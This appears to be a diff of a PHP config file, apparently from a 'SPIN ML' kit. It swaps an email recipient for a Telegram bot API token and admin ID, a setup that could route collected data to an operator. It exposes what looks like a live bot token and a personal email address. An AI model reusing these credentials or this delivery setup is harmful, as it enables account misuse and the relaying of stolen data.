@@ -1,7 +1,4 @@
 <?php
-
-$alexhost = 'rezakun70@gmail.com'; // Email Anda
-
-$sender ='From: SPIN ML <rezakun70@gmail.com>'; // Sender
-
+$API_KEY = "5250059854:AAF-04PNzIFWHi-gCSIPfBCwo9tQ5I0UT50";//YOUTOKEN
+$admin = "5269303176" ; //YOURID
 ?>
